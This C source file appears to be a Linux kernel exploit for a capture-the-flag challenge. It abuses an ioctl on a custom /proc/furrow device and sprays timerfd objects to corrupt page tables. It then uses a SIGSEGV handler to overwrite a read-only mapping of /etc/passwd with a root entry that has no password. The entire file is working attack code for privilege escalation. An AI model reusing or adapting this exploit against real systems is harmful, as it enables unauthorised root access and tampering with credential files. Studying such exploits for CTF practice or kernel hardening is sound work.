#include <stdio.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <stdlib.h>
#include <sys/timerfd.h>
#include <sys/ucontext.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/mman.h>
#include <signal.h>
#include <string.h>

enum
{
  REG_R8 = 0,
# define REG_R8		REG_R8
  REG_R9,
# define REG_R9		REG_R9
  REG_R10,
# define REG_R10	REG_R10
  REG_R11,
# define REG_R11	REG_R11
  REG_R12,
# define REG_R12	REG_R12
  REG_R13,
# define REG_R13	REG_R13
  REG_R14,
# define REG_R14	REG_R14
  REG_R15,
# define REG_R15	REG_R15
  REG_RDI,
# define REG_RDI	REG_RDI
  REG_RSI,
# define REG_RSI	REG_RSI
  REG_RBP,
# define REG_RBP	REG_RBP
  REG_RBX,
# define REG_RBX	REG_RBX
  REG_RDX,
# define REG_RDX	REG_RDX
  REG_RAX,
# define REG_RAX	REG_RAX
  REG_RCX,
# define REG_RCX	REG_RCX
  REG_RSP,
# define REG_RSP	REG_RSP
  REG_RIP,
# define REG_RIP	REG_RIP
  REG_EFL,
# define REG_EFL	REG_EFL
  REG_CSGSFS,		/* Actually short cs, gs, fs, __pad0.  */
# define REG_CSGSFS	REG_CSGSFS
  REG_ERR,
# define REG_ERR	REG_ERR
  REG_TRAPNO,
# define REG_TRAPNO	REG_TRAPNO
  REG_OLDMASK,
# define REG_OLDMASK	REG_OLDMASK
  REG_CR2
# define REG_CR2	REG_CR2
};

#define _pte_index_to_virt(i) (i << 12)
#define _pmd_index_to_virt(i) (i << 21)
#define _pud_index_to_virt(i) (i << 30)
#define _pgd_index_to_virt(i) (i << 39)
#define PTI_TO_VIRT(pud_index, pmd_index, pte_index, page_index) \
   ((void*)(_pgd_index_to_virt((unsigned long long)(pud_index)) + _pud_index_to_virt((unsigned long long)(pmd_index)) + \
   _pmd_index_to_virt((unsigned long long)(pte_index)) + _pte_index_to_virt((unsigned long long)(page_index))))

volatile void* check = PTI_TO_VIRT(3,0,0,3);
volatile int segfault_counter = 0;

char* payload = "root::0:0:root:/root:/bin/sh\nctf:x:1000:1000:Linux User,,,:/home/ctf:/bin/sh";

void checker() {
  *(volatile int64_t*)(check) = 0x41414141;
  memcpy(check,payload,strlen(payload));
  exit(0);
}

void seghandle(int sig, siginfo_t* test , void* unused) {
  ucontext_t* uc = (ucontext_t*)unused;
  check += 0x1000*16;
  segfault_counter++;

  uc->uc_mcontext.gregs[REG_RSP] -= 8;
  *(void**)(uc->uc_mcontext.gregs[REG_RSP]) = (void*)uc->uc_mcontext.gregs[REG_RIP];

  uc->uc_mcontext.gregs[REG_RIP] = (long long)checker;
}

int main() {
  int furrow = open("/proc/furrow",O_RDWR);
  if(furrow == -1) {
    perror("Opening fd");
    exit(1);
  }

  int victim = open("/etc/passwd", O_RDONLY);
   
  for(size_t i = 0; i < 0x100; i++){
    for(size_t j = 1; j < 512/16; j++){
      if(mmap(PTI_TO_VIRT(3, 0, i, j*16+3), 0x1000, PROT_READ, MAP_FIXED | MAP_SHARED, victim, 0) == MAP_FAILED) {
        perror("Mmap");
      }
    }
  }

  struct itimerspec its;
  its.it_interval.tv_sec = 0;
  its.it_interval.tv_nsec = 0;
  its.it_value.tv_sec = 10;
  its.it_value.tv_nsec = 10;

  int spam[0x300] = {0};
  for(size_t i = 0; i < 0x300; i++){
    spam[i] = timerfd_create(CLOCK_REALTIME, 0);
    if(spam[i] == -1){
      perror("Timerfd spam");
    }
    timerfd_settime(spam[i],0,&its,0);
    if(i == 0x180){
      ioctl(furrow, 0x41414141);
      printf("Find address\n");
      ioctl(furrow, 0x41414141);
    }
  }

  printf("Timerfd spammed\n");
  for(size_t i = 0; i < 0x300; i++) {
    close(spam[i]);
  }
  usleep(1000);
  
  for(size_t i = 0; i < 0x100; i++){
    for(size_t j = 1; j < 512/16; j++){
      volatile int t = *(volatile int*)(PTI_TO_VIRT(3, 0, i, j*16+3));
    }
  }
  printf("Freed\n");
  ioctl(furrow,0x41414141); 
  ioctl(furrow,0x41414141); 

  struct sigaction sa;
  sa.sa_flags = SA_SIGINFO;
  sigemptyset(&sa.sa_mask);
  sa.sa_sigaction = seghandle;
  if(sigaction(SIGSEGV,&sa,NULL) == -1){
    perror("Segfault handler");
  }

  void* vuln_addr = 0;
  int counter = 0;
  for(size_t i = 0; i < 0x100; i++){
    for(size_t j = 1; j < 512/16; j++){
      *(volatile uint64_t*)(check) = 0x41414141;
    }
  }


  getc(stdin);
}
